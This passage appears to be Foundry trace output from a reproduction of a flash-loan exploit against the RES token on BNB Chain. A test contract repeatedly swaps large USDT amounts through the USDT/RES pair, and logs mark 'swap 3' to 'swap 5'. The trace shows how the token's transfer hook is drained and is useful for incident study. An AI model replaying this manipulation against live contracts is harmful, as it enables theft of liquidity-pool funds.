+    │   │   │   │   ├─ [893] USDT_RES_PAIR::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1690604547943213736988780 [1.69e24], 17064105338080 [1.706e13], 1665051347 [1.665e9]
+    │   │   │   │   ├─ [465] USDT_RES_PAIR::token0() [staticcall]
+    │   │   │   │   │   └─ ← [Return] USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]
+    │   │   │   │   ├─ [1021] PS_ROUTER::getAmountOut(234320207184 [2.343e11], 17064105338080 [1.706e13], 1690604547943213736988780 [1.69e24]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 22844034674355072694894 [2.284e22]
+    │   │   │   │   ├─ [252] PS_ROUTER::factory() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73
+    │   │   │   │   ├─ [676] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::getPair(USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955], 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7) [staticcall]
+    │   │   │   │   │   └─ ← [Return] USDT_ALL_PAIR: [0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb]
+    │   │   │   │   ├─ [893] USDT_ALL_PAIR::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 480129195968803076456 [4.801e20], 41761128268609605264847 [4.176e22], 1665044901 [1.665e9]
+    │   │   │   │   ├─ [465] USDT_ALL_PAIR::token0() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7
+    │   │   │   │   ├─ [1021] PS_ROUTER::getAmountOut(22844034674355072694894 [2.284e22], 41761128268609605264847 [4.176e22], 480129195968803076456 [4.801e20]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 169496480478498624709 [1.694e20]
+    │   │   │   │   ├─ [6418] 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7::transfer(0x3F693Effc53908d517F186A20431f756C90c2229, 169496480478498624709 [1.694e20])
+    │   │   │   │   │   ├─ [439] USDT_ALL_PAIR::totalSupply() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 4475079325253002664477 [4.475e21]
+    │   │   │   │   │   ├─ emit Transfer(from: RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], to: 0x3F693Effc53908d517F186A20431f756C90c2229, value: 169496480478498624709 [1.694e20])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [252] PS_ROUTER::factory() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73
+    │   │   │   │   ├─ [676] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::getPair(RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]
+    │   │   │   │   ├─ [893] USDT_RES_PAIR::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1690604547943213736988780 [1.69e24], 17064105338080 [1.706e13], 1665051347 [1.665e9]
+    │   │   │   │   ├─ [465] USDT_RES_PAIR::token0() [staticcall]
+    │   │   │   │   │   └─ ← [Return] USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]
+    │   │   │   │   ├─ [1021] PS_ROUTER::getAmountOut(624853885825 [6.248e11], 17064105338080 [1.706e13], 1690604547943213736988780 [1.69e24]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 59575745589314723074220 [5.957e22]
+    │   │   │   │   ├─ [252] PS_ROUTER::factory() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73
+    │   │   │   │   ├─ [676] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::getPair(USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955], 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7) [staticcall]
+    │   │   │   │   │   └─ ← [Return] USDT_ALL_PAIR: [0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb]
+    │   │   │   │   ├─ [893] USDT_ALL_PAIR::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 480129195968803076456 [4.801e20], 41761128268609605264847 [4.176e22], 1665044901 [1.665e9]
+    │   │   │   │   ├─ [465] USDT_ALL_PAIR::token0() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7
+    │   │   │   │   ├─ [1021] PS_ROUTER::getAmountOut(59575745589314723074220 [5.957e22], 41761128268609605264847 [4.176e22], 480129195968803076456 [4.801e20]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 281975759606721735671 [2.819e20]
+    │   │   │   │   ├─ [6418] 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7::transfer(0xe3f0C9F99BECced5197300d64ea3a814ECD862f7, 281975759606721735671 [2.819e20])
+    │   │   │   │   │   ├─ [439] USDT_ALL_PAIR::totalSupply() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 4475079325253002664477 [4.475e21]
+    │   │   │   │   │   ├─ emit Transfer(from: RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], to: 0xe3f0C9F99BECced5197300d64ea3a814ECD862f7, value: 281975759606721735671 [2.819e20])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ emit Transfer(from: USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A], to: 0x3F693Effc53908d517F186A20431f756C90c2229, value: 6639072536899 [6.639e12])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [531] USDT_TOKEN::balanceOf(USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]) [staticcall]
+    │   │   │   │   └─ ← [Return] 3121193246038479510536868 [3.121e24]
+    │   │   │   ├─ [563] RES_TOKEN::balanceOf(USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]) [staticcall]
+    │   │   │   │   └─ ← [Return] 9253431765257 [9.253e12]
+    │   │   │   ├─ emit Sync(reserve0: 3121193246038479510536868 [3.121e24], reserve1: 9253431765257 [9.253e12])
+    │   │   │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 1430588698095265773548088 [1.43e24], amount1In: 0, amount0Out: 0, amount1Out: 7810673572823 [7.81e12], to: 0x3F693Effc53908d517F186A20431f756C90c2229)
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [0] console::log("[FlashLoan] swap 3 over") [staticcall]
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [3271] USDT_TOKEN::transfer(USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A], 1907451597460354364730784 [1.907e24])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A], value: 1907451597460354364730784 [1.907e24])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [101055] USDT_RES_PAIR::swap(0, 3504534400905 [3.504e12], 0x3F693Effc53908d517F186A20431f756C90c2229, 0x)
+    │   │   │   ├─ [85933] RES_TOKEN::transfer(0x3F693Effc53908d517F186A20431f756C90c2229, 3504534400905 [3.504e12])
+    │   │   │   │   ├─ [439] USDT_RES_PAIR::totalSupply() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 5607099684513225068 [5.607e18]
+    │   │   │   │   ├─ [465] USDT_RES_PAIR::token0() [staticcall]
+    │   │   │   │   │   └─ ← [Return] USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]
+    │   │   │   │   ├─ [397] USDT_RES_PAIR::token1() [staticcall]
+    │   │   │   │   │   └─ ← [Return] RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21]
+    │   │   │   │   ├─ [893] USDT_RES_PAIR::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 3121193246038479510536868 [3.121e24], 9253431765257 [9.253e12], 1665051347 [1.665e9]
+    │   │   │   │   ├─ [531] USDT_TOKEN::balanceOf(USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 5028644843498833875267652 [5.028e24]
+    │   │   │   │   ├─ [658] PS_ROUTER::quote(3504534400905 [3.504e12], 9253431765257 [9.253e12], 3121193246038479510536868 [3.121e24]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1182083510215455681150858 [1.182e24]
+    │   │   │   │   ├─ [531] USDT_TOKEN::balanceOf(USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 5028644843498833875267652 [5.028e24]
+    │   │   │   │   ├─ emit Transfer(from: DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38], to: 0x8a08757fB9331ABEE2453C726f93Aea3FF2d078A, value: 70090688018 [7.009e10])
+    │   │   │   │   ├─ emit Transfer(from: DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38], to: 0x55E9d467d778DCAeea53AC11C9aBB58298a973dF, value: 70090688018 [7.009e10])
+    │   │   │   │   ├─ [252] PS_ROUTER::factory() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73
+    │   │   │   │   ├─ [676] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::getPair(RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]
+    │   │   │   │   ├─ [893] USDT_RES_PAIR::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 3121193246038479510536868 [3.121e24], 9253431765257 [9.253e12], 1665051347 [1.665e9]
+    │   │   │   │   ├─ [465] USDT_RES_PAIR::token0() [staticcall]
+    │   │   │   │   │   └─ ← [Return] USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]
+    │   │   │   │   ├─ [1021] PS_ROUTER::getAmountOut(105136032027 [1.051e11], 9253431765257 [9.253e12], 3121193246038479510536868 [3.121e24]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 34977434470468682639372 [3.497e22]
+    │   │   │   │   ├─ [252] PS_ROUTER::factory() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73
+    │   │   │   │   ├─ [676] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::getPair(USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955], 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7) [staticcall]
+    │   │   │   │   │   └─ ← [Return] USDT_ALL_PAIR: [0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb]
+    │   │   │   │   ├─ [893] USDT_ALL_PAIR::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 480129195968803076456 [4.801e20], 41761128268609605264847 [4.176e22], 1665044901 [1.665e9]
+    │   │   │   │   ├─ [465] USDT_ALL_PAIR::token0() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7
+    │   │   │   │   ├─ [1021] PS_ROUTER::getAmountOut(34977434470468682639372 [3.497e22], 41761128268609605264847 [4.176e22], 480129195968803076456 [4.801e20]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 218544796941819857692 [2.185e20]
+    │   │   │   │   ├─ [6418] 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7::transfer(0x3F693Effc53908d517F186A20431f756C90c2229, 218544796941819857692 [2.185e20])
+    │   │   │   │   │   ├─ [439] USDT_ALL_PAIR::totalSupply() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 4475079325253002664477 [4.475e21]
+    │   │   │   │   │   ├─ emit Transfer(from: RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], to: 0x3F693Effc53908d517F186A20431f756C90c2229, value: 218544796941819857692 [2.185e20])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [252] PS_ROUTER::factory() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73
+    │   │   │   │   ├─ [676] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::getPair(RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]
+    │   │   │   │   ├─ [893] USDT_RES_PAIR::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 3121193246038479510536868 [3.121e24], 9253431765257 [9.253e12], 1665051347 [1.665e9]
+    │   │   │   │   ├─ [465] USDT_RES_PAIR::token0() [staticcall]
+    │   │   │   │   │   └─ ← [Return] USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]
+    │   │   │   │   ├─ [1021] PS_ROUTER::getAmountOut(280362752072 [2.803e11], 9253431765257 [9.253e12], 3121193246038479510536868 [3.121e24]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 91563001272812646086591 [9.156e22]
+    │   │   │   │   ├─ [252] PS_ROUTER::factory() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73
+    │   │   │   │   ├─ [676] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::getPair(USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955], 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7) [staticcall]
+    │   │   │   │   │   └─ ← [Return] USDT_ALL_PAIR: [0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb]
+    │   │   │   │   ├─ [893] USDT_ALL_PAIR::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 480129195968803076456 [4.801e20], 41761128268609605264847 [4.176e22], 1665044901 [1.665e9]
+    │   │   │   │   ├─ [465] USDT_ALL_PAIR::token0() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7
+    │   │   │   │   ├─ [1021] PS_ROUTER::getAmountOut(91563001272812646086591 [9.156e22], 41761128268609605264847 [4.176e22], 480129195968803076456 [4.801e20]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 329479633713317220441 [3.294e20]
+    │   │   │   │   ├─ [6418] 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7::transfer(0xe3f0C9F99BECced5197300d64ea3a814ECD862f7, 329479633713317220441 [3.294e20])
+    │   │   │   │   │   ├─ [439] USDT_ALL_PAIR::totalSupply() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 4475079325253002664477 [4.475e21]
+    │   │   │   │   │   ├─ emit Transfer(from: RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], to: 0xe3f0C9F99BECced5197300d64ea3a814ECD862f7, value: 329479633713317220441 [3.294e20])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ emit Transfer(from: USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A], to: 0x3F693Effc53908d517F186A20431f756C90c2229, value: 2978854240769 [2.978e12])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [531] USDT_TOKEN::balanceOf(USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]) [staticcall]
+    │   │   │   │   └─ ← [Return] 5028644843498833875267652 [5.028e24]
+    │   │   │   ├─ [563] RES_TOKEN::balanceOf(USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]) [staticcall]
+    │   │   │   │   └─ ← [Return] 5748897364352 [5.748e12]
+    │   │   │   ├─ emit Sync(reserve0: 5028644843498833875267652 [5.028e24], reserve1: 5748897364352 [5.748e12])
+    │   │   │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 1907451597460354364730784 [1.907e24], amount1In: 0, amount0Out: 0, amount1Out: 3504534400905 [3.504e12], to: 0x3F693Effc53908d517F186A20431f756C90c2229)
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [0] console::log("[FlashLoan] swap 4 over") [staticcall]
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [3271] USDT_TOKEN::transfer(USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A], 2384314496825442955913480 [2.384e24])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A], value: 2384314496825442955913480 [2.384e24])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [101055] USDT_RES_PAIR::swap(0, 1845944923363 [1.845e12], 0x3F693Effc53908d517F186A20431f756C90c2229, 0x)
+    │   │   │   ├─ [85933] RES_TOKEN::transfer(0x3F693Effc53908d517F186A20431f756C90c2229, 1845944923363 [1.845e12])
+    │   │   │   │   ├─ [439] USDT_RES_PAIR::totalSupply() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 5607099684513225068 [5.607e18]
+    │   │   │   │   ├─ [465] USDT_RES_PAIR::token0() [staticcall]
+    │   │   │   │   │   └─ ← [Return] USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]
+    │   │   │   │   ├─ [397] USDT_RES_PAIR::token1() [staticcall]
+    │   │   │   │   │   └─ ← [Return] RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21]
+    │   │   │   │   ├─ [893] USDT_RES_PAIR::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 5028644843498833875267652 [5.028e24], 5748897364352 [5.748e12], 1665051347 [1.665e9]
+    │   │   │   │   ├─ [531] USDT_TOKEN::balanceOf(USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 7412959340324276831181132 [7.412e24]
+    │   │   │   │   ├─ [658] PS_ROUTER::quote(1845944923363 [1.845e12], 5748897364352 [5.748e12], 5028644843498833875267652 [5.028e24]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1614675098882811502538778 [1.614e24]
+    │   │   │   │   ├─ [531] USDT_TOKEN::balanceOf(USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 7412959340324276831181132 [7.412e24]
+    │   │   │   │   ├─ emit Transfer(from: DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38], to: 0x8a08757fB9331ABEE2453C726f93Aea3FF2d078A, value: 36918898467 [3.691e10])
+    │   │   │   │   ├─ emit Transfer(from: DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38], to: 0x55E9d467d778DCAeea53AC11C9aBB58298a973dF, value: 36918898467 [3.691e10])
+    │   │   │   │   ├─ [252] PS_ROUTER::factory() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73
+    │   │   │   │   ├─ [676] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::getPair(RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]
+    │   │   │   │   ├─ [893] USDT_RES_PAIR::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 5028644843498833875267652 [5.028e24], 5748897364352 [5.748e12], 1665051347 [1.665e9]
+    │   │   │   │   ├─ [465] USDT_RES_PAIR::token0() [staticcall]
+    │   │   │   │   │   └─ ← [Return] USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]
+    │   │   │   │   ├─ [1021] PS_ROUTER::getAmountOut(55378347700 [5.537e10], 5748897364352 [5.748e12], 5028644843498833875267652 [5.028e24]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 47859282914456919508228 [4.785e22]
+    │   │   │   │   ├─ [252] PS_ROUTER::factory() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73
+    │   │   │   │   ├─ [676] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::getPair(USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955], 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7) [staticcall]
+    │   │   │   │   │   └─ ← [Return] USDT_ALL_PAIR: [0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb]
+    │   │   │   │   ├─ [893] USDT_ALL_PAIR::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 480129195968803076456 [4.801e20], 41761128268609605264847 [4.176e22], 1665044901 [1.665e9]
+    │   │   │   │   ├─ [465] USDT_ALL_PAIR::token0() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7
+    │   │   │   │   ├─ [1021] PS_ROUTER::getAmountOut(47859282914456919508228 [4.785e22], 41761128268609605264847 [4.176e22], 480129195968803076456 [4.801e20]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 256100525467039065770 [2.561e20]
+    │   │   │   │   ├─ [6418] 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7::transfer(0x3F693Effc53908d517F186A20431f756C90c2229, 256100525467039065770 [2.561e20])
+    │   │   │   │   │   ├─ [439] USDT_ALL_PAIR::totalSupply() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 4475079325253002664477 [4.475e21]
+    │   │   │   │   │   ├─ emit Transfer(from: RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], to: 0x3F693Effc53908d517F186A20431f756C90c2229, value: 256100525467039065770 [2.561e20])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [252] PS_ROUTER::factory() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73
+    │   │   │   │   ├─ [676] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::getPair(RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]
+    │   │   │   │   ├─ [893] USDT_RES_PAIR::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 5028644843498833875267652 [5.028e24], 5748897364352 [5.748e12], 1665051347 [1.665e9]
+    │   │   │   │   ├─ [465] USDT_RES_PAIR::token0() [staticcall]
+    │   │   │   │   │   └─ ← [Return] USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]
+    │   │   │   │   ├─ [1021] PS_ROUTER::getAmountOut(147675593868 [1.476e11], 5748897364352 [5.748e12], 5028644843498833875267652 [5.028e24]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 125631952748297881719058 [1.256e23]
+    │   │   │   │   ├─ [252] PS_ROUTER::factory() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73
+    │   │   │   │   ├─ [676] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::getPair(USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955], 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7) [staticcall]
+    │   │   │   │   │   └─ ← [Return] USDT_ALL_PAIR: [0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb]
+    │   │   │   │   ├─ [893] USDT_ALL_PAIR::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 480129195968803076456 [4.801e20], 41761128268609605264847 [4.176e22], 1665044901 [1.665e9]
+    │   │   │   │   ├─ [465] USDT_ALL_PAIR::token0() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7
+    │   │   │   │   ├─ [1021] PS_ROUTER::getAmountOut(125631952748297881719058 [1.256e23], 41761128268609605264847 [4.176e22], 480129195968803076456 [4.801e20]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 360121673765865328218 [3.601e20]
+    │   │   │   │   ├─ [6418] 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7::transfer(0xe3f0C9F99BECced5197300d64ea3a814ECD862f7, 360121673765865328218 [3.601e20])
+    │   │   │   │   │   ├─ [439] USDT_ALL_PAIR::totalSupply() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 4475079325253002664477 [4.475e21]
+    │   │   │   │   │   ├─ emit Transfer(from: RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], to: 0xe3f0C9F99BECced5197300d64ea3a814ECD862f7, value: 360121673765865328218 [3.601e20])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ emit Transfer(from: USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A], to: 0x3F693Effc53908d517F186A20431f756C90c2229, value: 1569053184858 [1.569e12])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [531] USDT_TOKEN::balanceOf(USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]) [staticcall]
+    │   │   │   │   └─ ← [Return] 7412959340324276831181132 [7.412e24]
+    │   │   │   ├─ [563] RES_TOKEN::balanceOf(USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]) [staticcall]
+    │   │   │   │   └─ ← [Return] 3902952440989 [3.902e12]
+    │   │   │   ├─ emit Sync(reserve0: 7412959340324276831181132 [7.412e24], reserve1: 3902952440989 [3.902e12])
+    │   │   │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 2384314496825442955913480 [2.384e24], amount1In: 0, amount0Out: 0, amount1Out: 1845944923363 [1.845e12], to: 0x3F693Effc53908d517F186A20431f756C90c2229)
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [0] console::log("[FlashLoan] swap 5 over") [staticcall]
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [3271] USDT_TOKEN::transfer(USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A], 2861177396190531547096176 [2.861e24])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A], value: 2861177396190531547096176 [2.861e24])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [101055] USDT_RES_PAIR::swap(0, 1084945873965 [1.084e12], 0x3F693Effc53908d517F186A20431f756C90c2229, 0x)
+    │   │   │   ├─ [85933] RES_TOKEN::transfer(0x3F693Effc53908d517F186A20431f756C90c2229, 1084945873965 [1.084e12])
+    │   │   │   │   ├─ [439] USDT_RES_PAIR::totalSupply() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 5607099684513225068 [5.607e18]
+    │   │   │   │   ├─ [465] USDT_RES_PAIR::token0() [staticcall]
+    │   │   │   │   │   └─ ← [Return] USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]
+    │   │   │   │   ├─ [397] USDT_RES_PAIR::token1() [staticcall]
+    │   │   │   │   │   └─ ← [Return] RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21]
+    │   │   │   │   ├─ [893] USDT_RES_PAIR::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 7412959340324276831181132 [7.412e24], 3902952440989 [3.902e12], 1665051347 [1.665e9]
+    │   │   │   │   ├─ [531] USDT_TOKEN::balanceOf(USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 10274136736514808378277308 [1.027e25]
+    │   │   │   │   ├─ [658] PS_ROUTER::quote(1084945873965 [1.084e12], 3902952440989 [3.902e12], 7412959340324276831181132 [7.412e24]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 2060660428677203975652508 [2.06e24]
+    │   │   │   │   ├─ [531] USDT_TOKEN::balanceOf(USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 10274136736514808378277308 [1.027e25]
+    │   │   │   │   ├─ emit Transfer(from: DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38], to: 0x8a08757fB9331ABEE2453C726f93Aea3FF2d078A, value: 21698917479 [2.169e10])
